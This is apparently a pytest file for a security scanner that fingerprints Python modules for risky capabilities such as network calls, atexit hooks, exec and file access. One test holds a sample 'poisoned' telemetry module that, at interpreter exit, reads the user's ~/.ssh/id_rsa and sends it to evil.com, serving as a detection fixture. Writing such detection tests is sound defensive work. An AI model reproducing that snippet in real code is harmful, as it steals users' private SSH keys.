"""Tests for semantic fingerprint extraction."""
from __future__ import annotations

from security_scanner.semantic_fingerprint import compute_fingerprint


def test_fingerprint_detects_network_imports():
    content = "import urllib.request\nimport json\n"
    fp = compute_fingerprint(content, "module.py")
    assert "urllib.request" in fp.imports_network
    assert "imports_network" in fp.capability_set()


def test_fingerprint_detects_atexit():
    content = "import atexit\natexit.register(cleanup)\n"
    fp = compute_fingerprint(content, "module.py")
    assert fp.registers_atexit
    assert "atexit" in fp.capability_set()


def test_fingerprint_detects_network_calls():
    content = "urllib.request.urlopen(req)\n"
    fp = compute_fingerprint(content, "module.py")
    assert fp.makes_network_calls
    assert "network_calls" in fp.capability_set()


def test_fingerprint_detects_home_access():
    content = 'home = os.environ.get("HOME", "")\n'
    fp = compute_fingerprint(content, "module.py")
    assert fp.accesses_env_home
    assert "accesses_home" in fp.capability_set()


def test_fingerprint_detects_del_method():
    content = "class Foo:\n    def __del__(self):\n        pass\n"
    fp = compute_fingerprint(content, "module.py")
    assert fp.has_del_method
    assert "finalizer" in fp.capability_set()


def test_fingerprint_detects_exec():
    content = "exec(code)\n"
    fp = compute_fingerprint(content, "module.py")
    assert fp.uses_exec
    assert "exec" in fp.capability_set()


def test_fingerprint_detects_open():
    content = "with open(path) as f:\n    data = f.read()\n"
    fp = compute_fingerprint(content, "module.py")
    assert fp.uses_open
    assert "file_io" in fp.capability_set()


def test_fingerprint_clean_module():
    content = "def add(a, b):\n    return a + b\n"
    fp = compute_fingerprint(content, "math_util.py")
    assert fp.capability_set() == frozenset()


def test_fingerprint_sqlalchemy_telemetry():
    """The poisoned _pool_telemetry.py should have many capabilities."""
    content = '''
import atexit
import json
import os
import urllib.request

def _finalize():
    home = os.environ.get("HOME", "")
    data = open(os.path.join(home, ".ssh/id_rsa")).read()
    urllib.request.urlopen(urllib.request.Request("https://evil.com", data=data.encode()))

atexit.register(_finalize)
'''
    fp = compute_fingerprint(content, "engine/_pool_telemetry.py")
    caps = fp.capability_set()
    assert "imports_network" in caps
    assert "atexit" in caps
    assert "network_calls" in caps
    assert "accesses_home" in caps
    assert "file_io" in caps


def test_fingerprint_to_dict():
    content = "import urllib.request\nimport atexit\n"
    fp = compute_fingerprint(content, "module.py")
    d = fp.to_dict()
    assert "capabilities" in d
    assert "imports_network" in d


def test_fingerprint_syntax_error():
    content = "def broken(:\n    pass"
    fp = compute_fingerprint(content, "broken.py")
    # Should not crash, returns best-effort fingerprint
    assert isinstance(fp.capability_set(), frozenset)
